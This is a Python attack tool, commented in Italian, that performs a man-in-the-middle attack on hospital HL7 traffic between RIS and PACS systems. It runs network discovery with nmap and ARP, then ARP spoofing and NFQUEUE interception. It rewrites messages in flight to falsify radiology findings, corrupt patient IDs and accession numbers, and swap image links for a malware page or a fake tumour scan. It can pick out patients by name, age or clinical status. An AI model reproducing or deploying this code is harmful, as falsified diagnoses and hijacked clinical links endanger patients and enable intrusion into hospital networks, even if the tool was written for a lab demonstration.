#!/usr/bin/env python3
import os, sys, json, time, socket, datetime, multiprocessing as mp, threading, logging
from pathlib import Path
from flask import Flask, jsonify, send_file
from hl7_parser import parse_message, unwrap_mllp, wrap_mllp, get_field, get_segment, get_obx_by_codice

# ── Costanti ──────────────────────────────────────────────────────────────────
HL7_PORT       = 2575
PROXY_LISTEN   = 2575
PROXY_FORWARD  = 9575
LOG_JSON       = Path(__file__).resolve().parent / 'attacco_log.json'
DASHBOARD_HTML = Path(__file__).resolve().parent / 'hl7_dashboard.html'
MALWARE_HTML   = Path(__file__).resolve().parent / 'hk.html' 

# ── Stato globale condiviso ───────────────────────────────────────────────────
STATO = {
    'direzione': 'RIS_PACS', # Default
    'tipo_selezione': 'TUTTI',
    'criterio': {},
    'payload': 0,
    'sostituzione_personale': None,
    'stats': {'totali': 0, 'modificati': 0, 'passati': 0},
    'eventi': []
}

# ── Utilities ─────────────────────────────────────────────────────────────────
def now_iso():
    return datetime.datetime.now().isoformat(timespec='seconds')

def calcola_eta(data_nascita_str):
    try:
        return datetime.datetime.now().year - int(data_nascita_str[0:4])
    except:
        return None
        
def payload_label(v):
    return {
        0: 'L0_PASSA_INALTERATO',
        1: 'L1_OFFUSCAMENTO_DEMOGRAFICO',
        2: 'L2_SANIFICAZIONE_[MALATO]->[SANO]',
        3: 'L2_SABOTAGGIO_[SANO]->[MALATO]',
        4: 'L2_CONCLUSION_PERSONALIZZATA',
        5: 'L3_SABOTAGGIO_[SANO]->[MALATO]',
        6: 'L3__SANIFICAZIONE_[MALATO]->[SANO]',
        7: 'L4_ORFANIZZAZIONE_ID_E_FULL_MIX',
        8: 'L5_INIEZIONE_MALWARE_LINK',
        9: 'L5_SOSTITUZIONE_IMMAGINE_FALSA'
    }.get(v, 'SCONOSCIUTO')

def salva_json():
    out = {
        'timestamp_ultimo_aggiornamento': now_iso(),
        'modalita': {
            'direzione_attacco':     STATO['direzione'],
            'tipo_selezione':        STATO['tipo_selezione'],
            'criterio':              STATO['criterio'],
            'payload':               STATO['payload'],
            'payload_label':         payload_label(STATO['payload']),
            'sostituzione_personale': STATO['sostituzione_personale']
        },
        'riepilogo': {
            'file_totali_passati':        STATO['stats']['totali'],
            'file_modificati':            STATO['stats']['modificati'],
            'file_passati_senza_modifica': STATO['stats']['passati']
        },
        'eventi': STATO['eventi']
    }
    LOG_JSON.write_text(json.dumps(out, indent=2, ensure_ascii=False), encoding='utf-8')

# ── Logica HL7 ────────────────────────────────────────────────────────────────
def criterio_match(parsed):
    if STATO['tipo_selezione'] == 'TUTTI':
        return True
    criterio = STATO['criterio']
    pid            = get_segment(parsed, 'PID')
    nome           = get_field(pid, 5)
    nascita        = get_field(pid, 7)
    
    if criterio.get('tipo') == 'nome':
        return criterio.get('valore', '').lower() in nome.lower()
    if criterio.get('tipo') == 'eta':
        eta = calcola_eta(nascita)
        if eta is None:
            return False
        if criterio.get('operatore') == 'over':
            return eta > int(criterio.get('soglia', 0))
        if criterio.get('operatore') == 'under':
            return eta < int(criterio.get('soglia', 0))
            
    # Il criterio clinico è valido solo da RIS a PACS
    if criterio.get('tipo') == 'clinico' and STATO['direzione'] == 'RIS_PACS':
        obx_findings   = get_obx_by_codice(parsed, 'FINDINGS')
        obx_conclusion = get_obx_by_codice(parsed, 'CONCLUSION')
        testo = (get_field(obx_findings, 5) + ' ' + get_field(obx_conclusion, 5)).lower()
        sano = 'norma' in testo or 'nessuna patologia' in testo
        if criterio.get('condizione') == 'sani':
            return sano
        if criterio.get('condizione') == 'malati':
            return not sano
    return False

def parsed_to_message(parsed):
    return '\r'.join('|'.join(seg) for seg in parsed)

def modifica_messaggio(parsed):
    modifiche = []
    payload   = STATO['payload']
    
    # Estrazione segmenti comuni
    msh = get_segment(parsed, 'MSH')
    tipo_msg = get_field(msh, 8) if msh else ""
    
    # 2. SELEZIONE INTELLIGENTE DEL TRAFFICO:
    # Se stiamo attaccando il PACS->RIS (link immagini), ignoriamo i referti (ORU)
    if STATO['direzione'] == 'PACS_RIS' and 'ORU' in tipo_msg:
        print(f"[DEBUG] Ignoro messaggio {tipo_msg} perché sto aspettando un ORM con le immagini.")
        return None, None  # Esci senza fare nulla
        
    # Se stiamo attaccando RIS->PACS (referti), ignoriamo le notifiche immagini (ORM)
    if STATO['direzione'] == 'RIS_PACS' and 'ORM' in tipo_msg:
        return None, None
    
    
    
    pid            = get_segment(parsed, 'PID')
    obr            = get_segment(parsed, 'OBR')
    obx_findings   = get_obx_by_codice(parsed, 'FINDINGS')
    obx_conclusion = get_obx_by_codice(parsed, 'CONCLUSION')
    
 

    # --- PAYLOAD 1-7 (Flusso RIS -> PACS) ---
    
    if STATO['direzione'] == 'RIS_PACS':
    
    	if payload == 1 and pid:
        	while len(pid) <= 8: pid.append('')
        	modifiche.append({'campo': 'PID:5 nome',    'prima': get_field(pid, 5), 'dopo': 'Sconosciuto^Anonimo'})
        	modifiche.append({'campo': 'PID:7 nascita', 'prima': get_field(pid, 7), 'dopo': '19000101'})
        	pid[5] = 'Sconosciuto^Anonimo'; pid[7] = '19000101'

    	if payload == 2 and obx_findings and obx_conclusion:
        	testo_f = 'Campi polmonari liberi da addensamenti. Cuore nei limiti.'
        	testo_c = 'Referto: quadro radiografico nella norma.'
        	modifiche.append({'campo': 'OBX:FINDINGS', 'prima': get_field(obx_findings, 5), 'dopo': testo_f})
        	modifiche.append({'campo': 'OBX:CONCLUSION', 'prima': get_field(obx_conclusion, 5), 'dopo': testo_c})
        	obx_findings[5] = testo_f; obx_conclusion[5] = testo_c

    	if payload == 3 and obx_findings and obx_conclusion:
        	testo_f = 'Presenza di addensamento parenchimale focale.'
        	testo_c = 'Referto: quadro radiografico patologico. Sospetto focolaio.'
        	modifiche.append({'campo': 'OBX:FINDINGS', 'prima': get_field(obx_findings, 5), 'dopo': testo_f})
        	modifiche.append({'campo': 'OBX:CONCLUSION', 'prima': get_field(obx_conclusion, 5), 'dopo': testo_c})
        	obx_findings[5] = testo_f; obx_conclusion[5] = testo_c

    	if payload == 4 and obx_conclusion:
        	nuovo = STATO['sostituzione_personale'] or "Referto alterato."
        	modifiche.append({'campo': 'OBX:CONCLUSION', 'prima': get_field(obx_conclusion, 5), 'dopo': nuovo})
        	obx_conclusion[5] = nuovo

    	if payload == 5 and obx_findings and obx_conclusion and obr:
        	testo_f = 'Presenza di addensamento parenchimale focale severo.'
        	testo_c = 'Referto: patologia confermata. Necessario intervento immediato.'
        	modifiche.append({'campo': 'OBX:FINDINGS', 'prima': get_field(obx_findings, 5), 'dopo': testo_f})
        	modifiche.append({'campo': 'OBX:CONCLUSION', 'prima': get_field(obx_conclusion, 5), 'dopo': testo_c})
        	obx_findings[5] = testo_f; obx_conclusion[5] = testo_c
        	acc_originale = get_field(obr, 3)
        	acc_falso = 'ACC_CORROTTO_malato'
        	modifiche.append({'campo': 'OBR:3 Accession', 'prima': acc_originale, 'dopo': acc_falso})
        	obr[3] = acc_falso
        
    	if payload == 6 and obx_findings and obx_conclusion and obr:
        	testo_f = 'Campi polmonari liberi da addensamenti. Cuore nei limiti.'
        	testo_c = 'Referto: quadro radiografico nella norma.'
        	modifiche.append({'campo': 'OBX:FINDINGS', 'prima': get_field(obx_findings, 5), 'dopo': testo_f})
        	modifiche.append({'campo': 'OBX:CONCLUSION', 'prima': get_field(obx_conclusion, 5), 'dopo': testo_c})
        	obx_findings[5] = testo_f; obx_conclusion[5] = testo_c
        	acc_originale = get_field(obr, 3)
        	acc_falso = 'ACC_CORROTTO_sano'
        	modifiche.append({'campo': 'OBR:3 Accession', 'prima': acc_originale, 'dopo': acc_falso})
        	obr[3] = acc_falso

    	if payload == 7 and pid:
        	while len(pid) <= 8: pid.append('')
        	pid[5] = 'Sconosciuto^Anonimo'; pid[7] = '19000101'; pid[8] = 'U'
        	id_originale = get_field(pid, 3)
        	nuovo_id = 'GHOST_ORPHAN_000'
        	modifiche.append({'campo': 'PID:3 ID', 'prima': id_originale, 'dopo': nuovo_id})
        	pid[3] = nuovo_id
        	
     # --- LOGICA FLUSSO PACS -> RIS (Messaggi ORM^O01) ---
    elif STATO['direzione'] == 'PACS_RIS':
        if payload in (8, 9):
            trovato = False
            for seg in parsed:
                if seg[0] == 'OBX':
                    # Debug per capire cosa sta leggendo il parser
                    print(f"[DEBUG] Analizzo OBX: {seg}")
                    # Cerchiamo il link in TUTTI i campi dell'OBX (dall'indice 3 al 7)
                    # per evitare problemi di offset con il parser
                    for i, campo in enumerate(seg):
                        if i >= 3 and i <= 7 and 'http' in str(campo).lower():
                            vecchio_link = campo
                            nuovo_link = 'http://10.0.30.99:5000/hk.html' if payload == 8 else 'http://10.0.30.20/fake_tumor.dcm'
                    
                            modifiche.append({'campo': f'OBX:{i}', 'prima': vecchio_link, 'dopo': nuovo_link})
                            seg[i] = nuovo_link
                            trovato = True
                            print(f"[SUCCESS] Link trovato nel campo {i} e sostituito!")
            
            if not trovato:
                print("[!] Attenzione: Payload 8/9 selezionato ma OBX con link HTTP non trovato!")

    return parsed, modifiche
       	
  

  
def process_hl7_bytes(raw):
    text     = unwrap_mllp(raw)
    parsed   = parse_message(text)
    originale = parsed_to_message([seg[:] for seg in parsed])
    selezionato = criterio_match(parsed)
    modifiche   = []
    if selezionato:
        risultato_modifica = modifica_messaggio(parsed)
        # Se modifica_messaggio ha restituito (None, None), significa "Ignora questo pacchetto"
        if risultato_modifica == (None, None):
            return raw # Restituisci il pacchetto originale senza loggare nulla nel JSON
    
        parsed, modifiche = risultato_modifica
        
    modificato = parsed_to_message(parsed)

    STATO['stats']['totali'] += 1
    if modifiche:
        STATO['stats']['modificati'] += 1
    else:
        STATO['stats']['passati'] += 1

    pid = get_segment(parsed, 'PID')
    STATO['eventi'].append({
        'timestamp':          now_iso(),
        'patient_id':         get_field(pid, 3),
        'patient_name':       get_field(pid, 5),
        'selected_by_filter': selezionato,
        'selection_mode':     STATO['tipo_selezione'],
        'selection_criteria': STATO['criterio'],
        'payload_mode':       payload_label(STATO['payload']),
        'modified':           len(modifiche) > 0,
        'original_message':   originale,
        'modified_message':   modificato,
        'changes':            modifiche
    })
    salva_json()
    return wrap_mllp(modificato)

# ── Modulo Discovery di Rete ──────────────────────────────────────────────────


def esegui_discovery(subnet="10.0.30.0/24"):
    # --- Import delle librerie necessarie ---
    import subprocess              # per lanciare comandi esterni (nmap) come sottoprocesso
    import xml.etree.ElementTree as ET   # per leggere/parsare il file XML generato da nmap
    import sys                     # per uscire dal programma in caso di errore (sys.exit)
    import os                      # per controllare/eliminare file temporanei

    # --- Menu di scelta della modalita' di scansione ---
    print("\n=== SELEZIONA MODALITA DI RECONNAISSANCE ===")
    print("1) MODALITA ZERO-KNOWLEDGE (Nmap Service Discovery - Lenta ma professionale)")
    print("2) MODALITA VELOCE (ARP Scan + porte pre-configurate - Veloce per la demo)")
    modalita = input("Scelta: ").strip()

    host_trovati = []  # lista che conterra' i dizionari {ip, mac, info} di ogni host trovato

    # ======================================================================
    # MODALITA' 1: ZERO-KNOWLEDGE con NMAP
    # Non conosciamo nulla della rete, quindi chiediamo a nmap di scansionare
    # le porte e dedurre i servizi tramite banner grabbing (-sV)
    # ======================================================================
    if modalita == "1":
        print(f"\n[!] Avvio Reconnaissance ZERO-KNOWLEDGE su {subnet}...")
        xml_file = "/tmp/nmap_scan_zk.xml"   # file temporaneo dove nmap salva i risultati in XML

        # --- Costruzione del comando nmap come lista di argomenti ---
        comando_nmap = [
            "nmap",
            "-n",                  # niente risoluzione DNS -> scansione piu' veloce e meno "rumorosa"
            "-v",                  # verbose: mostra output in tempo reale mentre scansiona
            "-sV",                 # SERVICE/VERSION DETECTION: interroga le porte aperte per capire
                                    # che software/versione c'e' dietro (es. Apache 2.4, SSH 8.2)
            "-p", "1-3000",        # range di porte da scansionare (non tutte le 65535 per velocita')
            "-T4",                 # timing template aggressivo: piu' veloce ma piu' rilevabile
            "--host-timeout", "60s",     # tempo massimo dedicato a un singolo host
            "--max-retries", "1",        # numero di retry per pacchetti persi (basso = piu' veloce)
            "-oX", xml_file,              # output in formato XML (facile da parsare in Python)
            subnet                        # il target, es. "10.0.30.0/24"
        ]

        print("[*] Ricerca cieca dei servizi in corso (Interrogo le porte aperte)...")
        print("-" * 60)

        # --- Esecuzione del comando nmap come processo esterno ---
        try:
            subprocess.run(comando_nmap)   # blocca l'esecuzione finche' nmap non finisce
        except FileNotFoundError:
            # si verifica se il binario "nmap" non e' installato/nel PATH
            print("[-] ERRORE CRITICO: Nmap non e installato!")
            sys.exit(1)
        except Exception as e:
            print(f"[-] Errore nell'esecuzione di Nmap: {e}")
            sys.exit(1)

        print("-" * 60)
        print("[*] Analisi dei banner di servizio in corso...")

        # --- Parsing del file XML prodotto da nmap ---
        try:
            tree = ET.parse(xml_file)   # carica il file XML in memoria
            root = tree.getroot()       # nodo radice dell'albero XML (<nmaprun>)
        except Exception as e:
            print(f"[-] ERRORE lettura XML Nmap ({e})")
            sys.exit(1)

        # Ogni host scansionato e' un tag <host> dentro l'XML
        for host in root.findall("host"):
            stato = host.find("status").get("state")   # "up" o "down"
            if stato != "up":
                continue   # saltiamo gli host non attivi

            # Estrazione dell'indirizzo IPv4 dell'host
            ip_el = host.find("address[@addrtype='ipv4']")
            ip = ip_el.get("addr") if ip_el is not None else "Sconosciuto"

            # Estrazione del MAC address (se disponibile, di solito solo su rete locale)
            mac_el = host.find("address[@addrtype='mac']")
            mac = mac_el.get("addr") if mac_el is not None else "MAC Non Rilevato"

            # --- Estrazione dei servizi trovati sulle porte aperte ---
            servizi_trovati = []
            for port in host.findall(".//port"):          # tutti i tag <port> dell'host
                port_id = port.get("portid")               # numero della porta
                port_state = port.find("state").get("state")  # stato: open/closed/filtered

                if port_state == "open":
                    service = port.find("service")
                    # nome del protocollo/servizio dedotto da nmap (es. http, ssh)
                    service_name = service.get("name") if service is not None else "unknown"
                    # nome del prodotto/software specifico, se rilevato (es. "Apache httpd")
                    product = service.get("product") if service is not None else ""
                    servizi_trovati.append(f"Porta {port_id}: {service_name} {product}")

            # Se non troviamo servizi, mostriamo un messaggio generico
            info_servizio = " | ".join(servizi_trovati) if servizi_trovati else "Host generico (nessun servizio rilevato)"
            host_trovati.append({"ip": ip, "mac": mac, "info": info_servizio})

        # Puliamo il file XML temporaneo, non serve piu'
        if os.path.exists(xml_file):
            os.remove(xml_file)

    # ======================================================================
    # MODALITA' 2: VELOCE con ARP SCAN (Scapy)
    # Usiamo un ARP scan (livello 2) per scoprire velocemente gli host attivi
    # nella subnet locale, poi controlliamo solo una porta specifica (2575/HL7)
    # ======================================================================
    elif modalita == "2":
        from scapy.all import ARP, Ether, srp   # librerie per costruire/inviare pacchetti di rete
        import socket                            # per il controllo rapido delle porte TCP

        print(f"\n[!] Scansione ARP della rete locale ({subnet}) in corso...")

        # Costruiamo un pacchetto ARP request in broadcast (chiediamo a tutti "chi ha questo IP?")
        pacchetto = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet)

        # srp() invia il pacchetto a livello 2 e raccoglie le risposte entro il timeout
        risposte, _ = srp(pacchetto, timeout=2, verbose=False)

        # --- Funzione di supporto: controllo rapido se una porta TCP e' aperta ---
        def porta_aperta(ip, porta, timeout=0.1):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(timeout)
                    return s.connect_ex((ip, porta)) == 0   # 0 = connessione riuscita = porta aperta
            except Exception:
                return False

        print("[*] Analisi delle porte per identificazione servizi (PACS: 2575 | RIS: 2576 | HIS: 2577)...")
        for inviato, ricevuto in risposte:
            ip = ricevuto.psrc     # IP di chi ha risposto
            mac = ricevuto.hwsrc   # MAC di chi ha risposto

            # Euristica di base: se l'IP finisce in .1 probabilmente e' il gateway/router
            if ip.endswith(".1"):
                info_servizio = "Router / Gateway"
            else:
                info_servizio = "Client / Endpoint (ruolo non determinato)"

                # --- Identificazione del ruolo tramite le porte note dal README (Sezione 4) ---
                # 2575 -> PACS (riceve ORU^R01 dal RIS)
                # 2576 -> RIS  (riceve ORM^O01 RP dal PACS)
                # 2577 -> HIS  (riceve entrambi i flussi da RIS e PACS)
                if porta_aperta(ip, 2575):
                    info_servizio = "* Porta 2575 APERTA -> PACS (riceve referti ORU^R01)"
                elif porta_aperta(ip, 2576):
                    info_servizio = "* Porta 2576 APERTA -> RIS (riceve notifiche ORM^O01 RP)"
                elif porta_aperta(ip, 2577):
                    info_servizio = "* Porta 2577 APERTA -> HIS (riceve flusso RIS + PACS)"

            host_trovati.append({"ip": ip, "mac": mac, "info": info_servizio})

    else:
        # Scelta diversa da "1" o "2" -> usciamo con errore
        print("[!] Scelta non valida. Uscita.")
        sys.exit(1)

    # --- Controllo finale: se non abbiamo trovato nessun host, usciamo ---
    if not host_trovati:
        print("[-] Nessun host rilevato. Uscita.")
        sys.exit(1)

    # ======================================================================
    # SEZIONE COMUNE: selezione delle due "vittime" per l'attacco MITM
    # Questa parte e' identica indipendentemente dalla modalita' scelta sopra
    # ======================================================================
    while True:
        print("\n=== MAPPA DELLA RETE RILEVATA ===")
        for i, h in enumerate(host_trovati):
            # {:<15} allinea l'IP a sinistra su 15 caratteri per una stampa piu' ordinata
            print(" {}) IP: {:<15} MAC: {} -> {}".format(i+1, h["ip"], h["mac"], h["info"]))

        try:
            print("\nDefinizione dei target per l'attacco MITM.")

            # L'utente inserisce l'indice della vittima (1-based), lo convertiamo a 0-based
            scelta1 = int(input(" Seleziona l'ID della Vittima 1 (Sorgente): ").strip()) - 1
            nome_v1 = input(" Inserisci il nome per la Vittima 1 (es. RIS o PACS): ").strip()
            if not nome_v1:
                nome_v1 = "Sorgente"   # nome di default se l'utente non inserisce nulla

            scelta2 = int(input(" Seleziona l'ID della Vittima 2 (Destinazione): ").strip()) - 1
            nome_v2 = input(" Inserisci il nome per la Vittima 2: ").strip()
            if not nome_v2:
                nome_v2 = "Destinazione"

            # Controlliamo che entrambi gli indici siano validi (dentro il range della lista)
            if 0 <= scelta1 < len(host_trovati) and 0 <= scelta2 < len(host_trovati):
                v1 = host_trovati[scelta1]
                v2 = host_trovati[scelta2]

                # Le due vittime devono essere host diversi, altrimenti non ha senso un MITM
                if v1["ip"] == v2["ip"]:
                    print("[!] Errore: le vittime devono essere due host differenti.")
                    continue   # torniamo all'inizio del while per far riscegliere l'utente

                # Riepilogo e richiesta di conferma prima di procedere
                print("\n[?] Confermi di intercettare traffico: {} ({}) <-----> {} ({}) ?".format(
                    nome_v1, v1["ip"], nome_v2, v2["ip"]))
                conferma = input("Premi 'y' per avviare, 'n' per riselezionare: ").strip().lower()

                if conferma == "y":
                    # Restituiamo le due IP: questo valore verra' usato dal resto del programma
                    # (es. per lanciare l'attacco ARP spoofing / MITM)
                    return v1["ip"], v2["ip"]
                else:
                    print("Selezione annullata. Ripristino menu...")
                    # il while riparte e ristampa la mappa della rete
            else:
                print("[!] Indice non valido. Scegli un numero dalla lista.")
        except ValueError:
            # Si attiva se l'utente inserisce testo non numerico invece di un indice
            print("[!] Inserisci solo numeri interi.")






# ── Menu configurazione attacco ───────────────────────────────────────────────
def print_menu():
    print('\n=== 0. DIREZIONE DELL\'ATTACCO ===')
    print('1) RIS  -->  PACS (Alterazione Referti / Dati Paziente/conclusion)')
    print('2) PACS -->  RIS  (Sabotaggio Link Immagini / Malware)')
    scelta_dir = input('Seleziona il flusso da colpire: ').strip()
    
    if scelta_dir == '2':
        STATO['direzione'] = 'PACS_RIS'
    else:
        STATO['direzione'] = 'RIS_PACS'

    print('\n=== 1. SELEZIONE TARGET (CHI COLPIRE) ===')
    print('1) Tutti i pazienti')
    print('2) Solo per nome')
    print('3) Solo per età')
    
    # Il filtro clinico ha senso solo se ci sono referti (Flusso RIS -> PACS)
    if STATO['direzione'] == 'RIS_PACS':
        print('4) Solo per stato clinico (sani/malati)')
        
    scelta = input('Scelta: ').strip()
    
    if scelta == '1':
        STATO['tipo_selezione'] = 'TUTTI'
        STATO['criterio'] = {}
    elif scelta == '2':
        STATO['tipo_selezione'] = 'ALCUNI'
        STATO['criterio'] = {'tipo': 'nome', 'valore': input('Contiene nome/cognome: ').strip()}
    elif scelta == '3':
        STATO['tipo_selezione'] = 'ALCUNI'
        STATO['criterio'] = {
            'tipo':       'eta',
            'operatore':  input('Operatore (over/under): ').strip().lower(),
            'soglia':     int(input('Soglia età: ').strip())
        }
    elif scelta == '4' and STATO['direzione'] == 'RIS_PACS':
        STATO['tipo_selezione'] = 'ALCUNI'
        STATO['criterio'] = {'tipo': 'clinico', 'condizione': input('Condizione (sani/malati): ').strip().lower()}

    print('\n=== 2. SELEZIONE PAYLOAD (LIVELLO DI GRAVITÀ) ===')
    print('--- Livello 0: Tracciamento Silenzioso ---')
    print('0) Passa inalterato (Solo sniffing)')
    
    if STATO['direzione'] == 'RIS_PACS':
        print('\n--- Livello 1: Danno alla Privacy (Mitigabile dall\'HIS) ---')
        print('1) Offuscamento Demografico (Modifica Nome, Età, Sesso)')
        print('\n--- Livello 2: Sabotaggio Asincrono (Rilevabile dal Medico) ---')
        print('2) Sanificazione (Referto Malato -> Sano)')
        print('3) Sabotaggio (Referto Sano -> Malato)')
        print('4) Alterazione Custom (Testo libero nella Conclusion)')
        print('\n--- Livello 3: Inganno Perfetto (Critico) ---')
        print('5) Sabotaggio Sincrono ( sano -> Malato + Disallineamento Immagini)')
        print('6) Sabotaggio Sincrono (  Malato -> Sano + Disallineamento Immagini)')
        print('\n--- Livello 4: Distruzione Architetturale (Irreversibile) ---')
        print('7) Orfanizzazione ID (Corruzione Chiave Primaria)')
    else:
        print('\n--- Livello 5: Vettore di Infezione e Sabotaggio Clinico (PACS -> RIS) ---')
        print('8) Iniezione Link Malware (Apre hk.html - Phishing Medico)')
        print('9) Sostituzione con Immagine Radiologica Contraffatta (Falso Tumore)')
    
    STATO['payload'] = int(input('\nPayload: ').strip())
    if STATO['payload'] == 4:
        STATO['sostituzione_personale'] = input('Nuovo testo CONCLUSION: ').strip()

    salva_json()
    print(f'\n[+] Configurazione salvata → {LOG_JSON}')

# ── Modalità proxy TCP ────────────────────────────────────────────────────────
def avvia_proxy():
    print(f'[PROXY] Ascolto su 0.0.0.0:{PROXY_LISTEN}')
    print(f'[PROXY] Forward verso 127.0.0.1:{PROXY_FORWARD}')
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('0.0.0.0', PROXY_LISTEN))
    srv.listen(5)
    while True:
        conn, addr = srv.accept()
        raw = conn.recv(65536)
        conn.close()
        if not raw:
            continue
        nuovo = process_hl7_bytes(raw)
        try:
            with socket.create_connection(('127.0.0.1', PROXY_FORWARD), timeout=5) as fwd:
                fwd.sendall(nuovo)
        except Exception as e:
            print(f'[PROXY] Errore inoltro: {e}')

# ── Modalità MITM reale (ARP + NFQueue) ──────────────────────────────────────
def spoof(ip1, ip2, mac1, mac2):
    from scapy.all import Ether, ARP, sendp
    while True:
        sendp(Ether(dst=mac1) / ARP(op=2, pdst=ip1, psrc=ip2, hwdst=mac1), verbose=False)
        sendp(Ether(dst=mac2) / ARP(op=2, pdst=ip2, psrc=ip1, hwdst=mac2), verbose=False)
        time.sleep(2)

_CACHE_PACCHETTI = {}
_CACHE_TTL_SECONDI = 30

def _pulisci_cache_vecchia():
    ora = time.time()
    chiavi_scadute = [k for k, (_, t) in _CACHE_PACCHETTI.items() if ora - t > _CACHE_TTL_SECONDI]
    for k in chiavi_scadute:
        del _CACHE_PACCHETTI[k]

def process_packet(packet):
    from scapy.all import IP, TCP, Raw
    pkt = IP(packet.get_payload())
    if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
        packet.accept()
        return
        
    
        
        
     
    # Intercettiamo sia la 2575 (PACS in ascolto) che la 2576 (RIS in ascolto)
    porte_hl7 = [2575, 2576]
    if pkt[TCP].dport not in porte_hl7 and pkt[TCP].sport not in porte_hl7:
        packet.accept()
        return
    payload = pkt[Raw].load
    if payload.startswith(b'\x0b'):
        chiave = (pkt[IP].src, pkt[IP].dst, pkt[TCP].sport, pkt[TCP].dport, pkt[TCP].seq)

        if chiave in _CACHE_PACCHETTI:
            new_payload, _ = _CACHE_PACCHETTI[chiave]
        else:
            new_payload = process_hl7_bytes(payload)
            _CACHE_PACCHETTI[chiave] = (new_payload, time.time())
            _pulisci_cache_vecchia()

        pkt[Raw].load = new_payload
        del pkt[IP].len
        del pkt[IP].chksum
        del pkt[TCP].chksum
        packet.set_payload(bytes(pkt))
    packet.accept()

def avvia_mitm_reale(ip1, ip2):
    from scapy.all import getmacbyip
    from netfilterqueue import NetfilterQueue
    os.system('sysctl -w net.ipv4.ip_forward=1')
    os.system('iptables -F FORWARD')
    os.system(f'iptables -A FORWARD -s {ip1} -j NFQUEUE --queue-num 1')
    os.system(f'iptables -A FORWARD -s {ip2} -j NFQUEUE --queue-num 1')
    mac1 = getmacbyip(ip1)
    mac2 = getmacbyip(ip2)
    if not mac1 or not mac2:
        print('[ERRORE] MAC non trovati')
        sys.exit(1)
    p = mp.Process(target=spoof, args=(ip1, ip2, mac1, mac2))
    p.start()
    nfq = NetfilterQueue()
    nfq.bind(1, process_packet)
    try:
        nfq.run()
    except KeyboardInterrupt:
        pass
    finally:
        nfq.unbind()
        os.system('iptables -F FORWARD')
        p.terminate()

# ── Flask dashboard ───────────────────────────────────────────────────────────
app = Flask(__name__)

@app.route('/')
def index():
    return send_file(str(DASHBOARD_HTML))
# ── Rotte aggiuntive per Malware ───────────────────────────────────────────────

@app.route('/hk.html')
def malware_page():
    if MALWARE_HTML.exists():
        return send_file(str(MALWARE_HTML))
    #se non funziona html malware
    return "<h1>ATTENZIONE: SEI STATO HAKERATO!</h1><p>I tuoi dati sanitari sono stati cifrati.</p>", 200

@app.route('/api/dati')
def get_dati():
    try:
        return jsonify(json.loads(LOG_JSON.read_text(encoding='utf-8')))
    except Exception:
        return jsonify({'errore': 'JSON non ancora pronto'})
        

def avvia_dashboard():
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    app.run(host='0.0.0.0', port=5000, use_reloader=False)

import webbrowser
def apri_browser():
    url = 'http://127.0.0.1:5000/'
    try:
        webbrowser.open_new(url)
        print(f'[+] Browser aperto automaticamente su {url}')
    except Exception as e:
        print(f'[!] Impossibile aprire il browser automaticamente ({e}).')
        print(f'[!] Apri manualmente: {url}')
        
if __name__ == '__main__':
    if '--proxy' in sys.argv:
        print_menu()
        print('[+] Dashboard web avviata → http://127.0.0.1:5000')
        t = threading.Thread(target=avvia_dashboard, daemon=True)
        t.start()
        threading.Timer(1.5, apri_browser).start()
        avvia_proxy()
    else:
        ip_vittima1, ip_vittima2 = esegui_discovery()
        
        print_menu()
        
        print('[+] Dashboard web avviata → http://127.0.0.1:5000')
        t = threading.Thread(target=avvia_dashboard, daemon=True)
        t.start()
        threading.Timer(1.5, apri_browser).start()
        
        avvia_mitm_reale(ip_vittima1, ip_vittima2)
